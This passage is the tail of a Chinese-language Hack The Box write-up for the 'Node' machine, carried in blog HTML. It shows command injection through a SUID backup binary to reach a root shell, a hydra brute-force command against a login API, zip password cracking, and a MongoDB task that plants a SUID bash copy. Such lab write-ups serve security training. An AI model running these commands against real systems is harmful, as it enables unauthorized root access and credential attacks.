= -1<br>fclose(0x8810008)                                = 0<br>+++ exited (status 0) +++<br>tom@node:~$ <br></code></pre></td></tr></table></figure>
+
+<p>27、这里使用了$这个变量传递的方法，进行了提权，并获取到了最后的flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">tom@node:~$ <br>tom@node:~$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 <span class="hljs-string">&quot;<span class="hljs-subst">$(printf &#x27;\n/bin/sh\necho OK&#x27;)</span>&quot;</span><br>&lt;c3d98a8d0230167104d474 <span class="hljs-string">&quot;<span class="hljs-subst">$(printf &#x27;\n/bin/sh\necho OK&#x27;)</span>&quot;</span>                     <br><br>zip error: Nothing to <span class="hljs-keyword">do</span>! (/tmp/.backup_632795909)<br><span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=1000(tom) <span class="hljs-built_in">groups</span>=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)<br><span class="hljs-comment"># python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>To run a <span class="hljs-built_in">command</span> as administrator (user <span class="hljs-string">&quot;root&quot;</span>), use <span class="hljs-string">&quot;sudo &lt;command&gt;&quot;</span>.<br>See <span class="hljs-string">&quot;man sudo_root&quot;</span> <span class="hljs-keyword">for</span> details.<br><br>root@node:~<span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>user.txt<br>root@node:~<span class="hljs-comment"># cd ~</span><br><span class="hljs-built_in">cd</span> ~<br>root@node:~<span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>user.txt<br>root@node:~<span class="hljs-comment"># cat /root/root.txt</span><br><span class="hljs-built_in">cat</span> /root/root.txt<br>b3774aca2c4cae14cb9d5c8379f5818f<br>root@node:~<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+<h4 id="0x03-其他补充"><a href="#0x03-其他补充" class="headerlink" title="0x03 其他补充"></a>0x03 其他补充</h4><p>28、补充的方法-爆破网站：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l myP14ceAdm1nAcc0uNT -P rockyou.txt 10.10.10.58 -s 3000 http-post-form<br><span class="hljs-string">&quot;/api/session/authenticate:&#123;\&quot;username\&quot;\:\&quot;^USER^\&quot;,\&quot;password\&quot;\:\&quot;^PASS^\&quot;&#125;:Authentication</span><br><span class="hljs-string">failed:H=Content-Type\: application/json&quot;</span> -t 64<br></code></pre></td></tr></table></figure>
+
+<p>29、破解压缩包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">base64</span> -d myplace.backup &gt; backup.zip <br>fcrackzip -D -p ../../wordlists/rockyou.txt -u backup.zip<br></code></pre></td></tr></table></figure>
+
+<p>30、mongo 数据库连接，与命令执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">mongo -p -u mark scheduler<br><br>db.tasks.insert(&#123;<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;/bin/cp /bin/bash /tmp/tom; /bin/chown tom:admin /tmp/tom; chmod</span><br><span class="hljs-string">g+s /tmp/tom; chmod u+s /tmp/tom&quot;</span>&#125;);<br></code></pre></td></tr></table></figure>
+
+<h4 id="0x04-通关凭证展示"><a href="#0x04-通关凭证展示" class="headerlink" title="0x04 通关凭证展示"></a>0x04 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/110</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Node-htb-writeup</div>
+      <div>https://sh1yan.top/2024/01/05/Node-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年1月5日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/01/06/Poison-htb-writeup/" title="Poison-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Poison-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/01/04/SolidState-htb-writeup/" title="SolidState-htb-writeup">
+                        <span class="hidden-mobile">SolidState-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
